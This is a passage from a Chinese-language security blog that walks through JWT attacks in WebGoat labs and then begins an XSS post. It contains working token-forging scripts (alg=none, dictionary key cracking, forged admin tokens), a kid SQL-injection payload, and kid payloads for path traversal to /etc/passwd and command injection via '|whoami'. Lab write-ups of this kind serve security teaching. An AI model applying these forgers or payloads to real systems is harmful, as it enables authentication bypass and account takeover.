class="attr">&quot;secretid&quot;</span><span class="punctuation">:</span><span class="string">&quot; &quot;</span></span><br><span class="line"> <span class="attr">&quot;aud&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webgoat.org&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1644039735</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1644039795</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tom@webgoat.org&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span>xxx</span><br><span class="line"><span class="punctuation">&#125;</span> </span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>secretid：密钥id值，当其为空时，jwt默认alg为none</li><li>aud：接收jwt的用户</li><li>iat：令牌生效时间 </li><li>exp：令牌到期时间</li><li>sub：主题</li><li>jti： jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击</li><li>nbf：定义在什么时间之前，该jwt都是不可用的.</li></ul><p> 文档：<a href="https://datatracker.ietf.org/doc/html/rfc7519#section-4.1">https://datatracker.ietf.org/doc/html/rfc7519#section-4.1</a></p><h3 id="签名（Signature）"><a href="#签名（Signature）" class="headerlink" title="签名（Signature）"></a>签名（Signature）</h3><p>​服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容（base64编码后的）用此密码进行加密，生成的字符串就是 JWT 的签名。 </p><p>以HMAC SHA256为例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> + base64UrlEncode(claims),secret)</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>在http header中添加</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure><h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><ul><li><p>防篡改取决于私钥和加密算法的安全性。</p></li><li><p>因为签名所以JWT能够防篡改起到认证功能，但是对于header和Claims部分只进行了base64URL编码，这意味着任何人都可以读取到这部分的信息，所以除非加密，否则不要在JWT的有效负载或报头元素中放置秘密信息。</p></li></ul><h1 id="如何生成JWT"><a href="#如何生成JWT" class="headerlink" title="如何生成JWT"></a>如何生成JWT</h1><ul><li><p>签名解析网站 <a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p></li><li><p>python</p><p>安装模块</p><p><a href="https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode">https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip uninstall JWT </span><br><span class="line">pip uninstall PyJWT </span><br><span class="line">pip install PyJWT==<span class="number">1.7</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 调用jwt库,生成json web token</span></span><br><span class="line">jwt_token = jwt.encode(payload=payload,  <span class="comment"># payload, 有效载体</span></span><br><span class="line">                       key=key,  <span class="comment"># 进行加密签名的密钥</span></span><br><span class="line">                       algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># 指明签名算法方式, 默认也是HS256</span></span><br><span class="line">                       headers=headers  <span class="comment"># json web token 数据结构包含两部分, payload(有效载体), headers(标头)</span></span><br><span class="line">                       ).decode(<span class="string">&#x27;ascii&#x27;</span>)  <span class="comment"># python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str</span></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br></pre></td></tr></table></figure></li></ul><h1 id="JWT检测"><a href="#JWT检测" class="headerlink" title="JWT检测"></a>JWT检测</h1><ul><li><p>JAVAweb</p></li><li><p>数据包请求头</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer</span><br></pre></td></tr></table></figure></li><li><p>数据包数据格式</p></li></ul><h1 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h1><h3 id="签名算法置None"><a href="#签名算法置None" class="headerlink" title="签名算法置None"></a>签名算法置None</h3><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>WebGoat JWT 5</p><p><img src="/../images/image-20230607173309475.png" alt="image-20230607173309475"></p><p>点击reset按钮，抓取数据包，将数据包中的token进行解密</p><p><img src="/../images/image-20230607173408930.png" alt="image-20230607173408930"></p><p>发现在声明部分有admin参数值为false，应该就是根据这个来判断用户是否为管理员</p><p><strong>将admin值修改为true</strong></p><p>这时候修改了声明部分的内容，签名就失效了，所以要绕过签名验证</p><p><strong>将头部alg值改为none，让服务器不进行签名验证</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1686993728</span>,</span><br><span class="line">  <span class="string">&quot;admin&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">  <span class="string">&quot;user&quot;</span>: <span class="string">&quot;Jerry&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">,algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607174127468.png" alt="image-20230607174127468"></p><h4 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br><span class="line">   <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line">   <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">   <span class="type">boolean</span> <span class="variable">isAdmin</span> <span class="operator">=</span> Boolean.valueOf((String) claims.get(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">   <span class="keyword">if</span> (isAdmin) &#123;</span><br><span class="line">     removeAllUsers();</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     log.error(<span class="string">&quot;You are not an admin user&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidTokenException</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键点在于</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br></pre></td></tr></table></figure><p>使用了错误的函数<code>parse(accessToken)</code>，而不是<code>parseClaimsJws(accessToken)</code>，导致jwt验证成功</p><p>正常情况下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parseClaimsJws(accessToken);</span><br></pre></td></tr></table></figure><ul><li><code>Jwts.parser()</code> 创建了一个<code>JwtParser</code>类的实例，用于解析和验证JWT。</li><li><code>setSigningKey(JWT_PASSWORD)</code> 设置用于签名JWT的密钥。<code>JWT_PASSWORD</code>变量应包含用于签名JWT的相同密钥。</li><li><code>parseClaimsJws(accessToken)</code> 解析包含在<code>accessToken</code>变量中的JWT，并将其作为<code>Jws&lt;Claims&gt;</code>对象返回。<code>Claims</code>对象包含JWT的有效负载，通常包括关于用户的信息以及授权请求所需的任何其他数据。</li></ul><p>需要注意的是，如果使用提供的密钥无法验证JWT，则<code>parseClaimsJws()</code>方法将抛出<code>SignatureException</code>。</p><h3 id="爆破密钥–修改签名"><a href="#爆破密钥–修改签名" class="headerlink" title="爆破密钥–修改签名"></a>爆破密钥–修改签名</h3><p>WebGoat JWT 10</p><p>工具</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./jwtcrack JWT数据</span><br><span class="line">hashcat</span><br></pre></td></tr></table></figure><p>python脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    1.若签名直接校验成功，则 key_ 为有效密钥；</span></span><br><span class="line"><span class="string">    2.若因数据部分预定义字段错误（jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError）导致校验失败，说明并非密钥错误导致，则 key_ 也为有效密钥；</span></span><br><span class="line"><span class="string">    3.若因密钥错误（jwt.exceptions.InvalidSignatureError）导致校验失败，则 key_ 为无效密钥；</span></span><br><span class="line"><span class="string">    4.若为其他原因（如，JWT 字符串格式错误）导致校验失败，根本无法验证当前 key_ 是否有效。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="comment">#import termcolor</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 提示里给的字典https://github.com/first20hours/google-10000-english</span></span><br><span class="line">dict_path = <span class="string">&#x27;path/10000_en_words.txt&#x27;</span></span><br><span class="line">JWT_STR = <span class="string">R&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.m-jSyfYEsVzD3CBI6N39wZ7AcdKdp_GiO7F_Ym12u-0&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jwt_str = JWT_STR</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(dict_path) <span class="keyword">as</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_)</span><br><span class="line">                <span class="comment">#print(&#x27;\r&#x27;, &#x27;\bbingo! found key --&gt;&#x27;, termcolor.colored(key_, &#x27;green&#x27;), &#x27;&lt;--&#x27;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;the key is [&#x27;</span>,key_,<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                <span class="comment">#print(&#x27;\r&#x27;, &#x27;\bbingo! found key --&gt;&#x27;, termcolor.colored(key_, &#x27;green&#x27;), &#x27;&lt;--&#x27;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;the key is [&#x27;</span>,key_,<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27; &#x27;</span> * <span class="number">64</span>, <span class="string">&#x27;\r\btry&#x27;</span>, key_, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bsorry! no key be found.&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607191917485.png" alt="image-20230607191917485"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;WebGoat Token Builder&quot;</span>,</span><br><span class="line">  <span class="string">&quot;aud&quot;</span>: <span class="string">&quot;webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1686136171</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1786136231</span>,   <span class="comment"># 修改jwt到期时间</span></span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;tom@webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;WebGoat&quot;</span>, <span class="comment"># 按题目要求修改名字</span></span><br><span class="line">  <span class="string">&quot;Email&quot;</span>: <span class="string">&quot;tom@webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Role&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;Manager&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Project Administrator&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">,algorithm=<span class="string">&quot;HS256&quot;</span>,key=<span class="string">&quot;available&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>将生成的token提交即可</p><p><img src="/../images/image-20230607192326261.png" alt="image-20230607192326261"></p><h3 id="访问令牌和刷新令牌"><a href="#访问令牌和刷新令牌" class="headerlink" title="访问令牌和刷新令牌"></a>访问令牌和刷新令牌</h3><h4 id="形成原因-1"><a href="#形成原因-1" class="headerlink" title="形成原因"></a><strong>形成原因</strong></h4><p>未校验access token和refresh token是否属于同一个用户，导致A用户可使用自己的refresh token去刷新B用户的access token</p><h4 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h4><p>WebGoat JWT 12</p><p>题目给出了Tom的旧token</p><p><img src="/../images/image-20230608205636773.png" alt="image-20230608205636773"></p><p>用jerry访问得到refresh token（密码在源码里）</p><p><img src="/../images/image-20230608205424807.png" alt="image-20230608205424807"></p><p>用jerry的refresh token 去刷新Tom的access token</p><p><img src="/../images/image-20230608210421439.png" alt="image-20230608210421439"></p><p>带上得到的accesstoken，去购物</p><p><img src="/../images/image-20230608210205494.png" alt="image-20230608210205494"></p><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a><strong>修复</strong></h4><p>跟踪哪个access token属于哪个refresh token,还可以检查用户的IP地址或地理位置。</p><h3 id="旧JWT复用"><a href="#旧JWT复用" class="headerlink" title="旧JWT复用"></a>旧JWT复用</h3><p>还是WebGoat JWT 12</p><p><img src="/../images/image-20230607193350002.png" alt="image-20230607193350002"></p><p><img src="/../images/image-20230607193221271.png" alt="image-20230607193221271"></p><h3 id="KID注入"><a href="#KID注入" class="headerlink" title="KID注入"></a>KID注入</h3><p>WebGoat JWT 13</p><p>查看对应源码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span>Jwts.parser().setSigningKeyResolver(<span class="keyword">new</span> <span class="title class_">SigningKeyResolverAdapter</span>() &#123;</span><br><span class="line">                        xxxxxxx</span><br><span class="line">                    &#125;).parseClaimsJws(token);</span><br><span class="line"><span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;Jerry&quot;</span>.equals(username)) &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-final-jerry-account&quot;</span>).build();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;Tom&quot;</span>.equals(username)) &#123;</span><br><span class="line">    <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-final-not-tom&quot;</span>).build();</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).output(e.toString()).build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑：获取密钥，然后解析token，获得claims中的username，如果为Tom则删除成功。</p><p><strong>关键</strong>：获取密钥的部分</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">SigningKeyResolverAdapter</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] resolveSigningKeyBytes(JwsHeader header, Claims claims) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">kid</span> <span class="operator">=</span> (String) header.get(<span class="string">&quot;kid&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">var</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection()) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 通过查询kid来获得key，很明显存在sql注入</span></span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span>connection.createStatement().executeQuery(<span class="string">&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot;</span> + kid + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">      </span><br><span class="line">            <span class="keyword">while</span> (rs.next()) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 返回base64解码后的key</span></span><br><span class="line">            <span class="keyword">return</span> TextCodec.BASE64.decode(rs.getString(<span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">catch</span> (SQLException e) </span><br><span class="line">        &#123;</span><br><span class="line">            errorMessage[<span class="number">0</span>] = e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常的思路是通过对kid参数进行sql注入，伪造key</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> key <span class="keyword">FROM</span> jwt_keys <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;&quot; + kid + &quot;&#x27;</span></span><br></pre></td></tr></table></figure><p>因为Tom的jwt中kid为<code>webgoat_key</code>，说明在jwt_keys表中有一个id的值为<code>webgoat_key</code>。</p><p>所以可以对kid注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kid: y<span class="string">&#x27; and 1=2 union select id from jwt_keys where id =&#x27;</span>webgoat_key</span><br></pre></td></tr></table></figure><p>这样sql查询的结果就为<code>webgoat_key</code>，即key为<code>webgoat_key</code>，但是因为</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TextCodec.BASE64.decode(rs.getString(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>无法对<code>webgoat_key</code>进行base64解码，就会抛出异常。</p><p>用<code>webgoat_key</code>作为key</p><p><img src="/../images/image-20230608204646391.png" alt="image-20230608204646391"></p><p>通过源码得到真正的key为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = base64.b64decode(<span class="string">&quot;qwertyqwerty1234&quot;</span>)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">token_dict = &#123;</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1529569536</span>,</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;WebGoat Token Builder&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">2018905304</span>,</span><br><span class="line">    <span class="string">&quot;aud&quot;</span>: <span class="string">&quot;webgoat.org&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;jerry@webgoat.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;Tom&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Email&quot;</span>: <span class="string">&quot;jerry@webgoat.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Role&quot;</span>: [<span class="string">&quot;Cat&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">key = base64.b64decode(<span class="string">&quot;qwertyqwerty1234&quot;</span>)</span><br><span class="line"><span class="comment"># headers</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">    <span class="comment"># &quot;kid&quot;: &quot;123&#x27; and 1=2 union select id FROM jwt_keys WHERE id=&#x27;webgoat_key&quot;,</span></span><br><span class="line">    <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;webgoat_key&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 调用jwt库,生成json web token</span></span><br><span class="line">jwt_token = jwt.encode(payload=token_dict,  <span class="comment"># payload, 有效载体</span></span><br><span class="line">                       key=key,  <span class="comment"># 进行加密签名的密钥</span></span><br><span class="line">                       algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># 指明签名算法方式, 默认也是HS256</span></span><br><span class="line">                       headers=headers  <span class="comment"># json web token 数据结构包含两部分, payload(有效载体), headers(标头)</span></span><br><span class="line">                       ).decode(<span class="string">&#x27;ascii&#x27;</span>)  <span class="comment"># python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str</span></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230608204947847.png" alt="image-20230608204947847"></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>选择哪种方法，取决于后端是如何利用kid来找到对应密钥</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#目录遍历</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">#sql注入</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;aaaaaaa&#x27; UNION SELECT &#x27;key&#x27;;-- &quot;</span></span><br><span class="line">#命令执行</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;/path/to/key_file|whoami&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="签名算法更改为对称加密"><a href="#签名算法更改为对称加密" class="headerlink" title="签名算法更改为对称加密"></a>签名算法更改为对称加密</h3><p>JWT中最常用的两种算法为<code>HMAC</code>和<code>RSA</code></p><blockquote><p>HMAC(HS256):是一种对称加密算法，使用秘密密钥对每条消息进行签名和验证<br>RSA(RS256)：是一种非对称加密算法，使用私钥加密明文，公钥解密密文。</p></blockquote><p>如果对方网站原来使用的是RS256，但是泄露了公钥，我们可以使用该公钥生成签名，并且将alg的值改为HS256，因为HS256为对称加密算法，所以网站就会使用该公钥验证签名，自然签名可以通过验证。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://jwt.io/introduction">https://jwt.io/introduction</a></p><p><a href="http://www.xianxianlabs.com/blog/2018/06/03/96.html">http://www.xianxianlabs.com/blog/2018/06/03/96.html</a></p><p><a href="https://www.freebuf.com/vuls/216457.html">https://www.freebuf.com/vuls/216457.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2023/06/01/XSS/"/>
      <url>/2023/06/01/XSS/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要在 <a href="https://xz.aliyun.com/t/9606">https://xz.aliyun.com/t/9606</a> 基础上进行学习</p><h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p> <strong>跨站脚本</strong>（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。</p><h1 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h1><p><img src="/../images/image-20230524205745342-1686840019396.png" alt="image-20230524205745342"></p><ul><li><p>反射型</p><p>用户输入什么网站返回什么，漏洞成型点在服务器端代码解析引擎</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// 直接将用户输入拼接到html中</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>常见场景：搜索功能等将输入直接回显的场景，通常需要诱导受害者点击才能实现攻击。</p></li><li><p>存储型</p><p>用户输入的数据会先存储到数据库中，只要查询到数据库中的脏数据，这些数据回显到页面就会触发XSS，漏洞成型点在<strong>数据库</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// 获取用户输入</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 防御sql注入（也不全，$name变量没有过滤）</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>( <span class="variable">$message</span> );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 没有考虑到对 XSS 进行过滤,将xss数据存入数据库中</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="comment">// 查询，拼接，触发xss</span></span><br><span class="line">    xxxx；</span><br><span 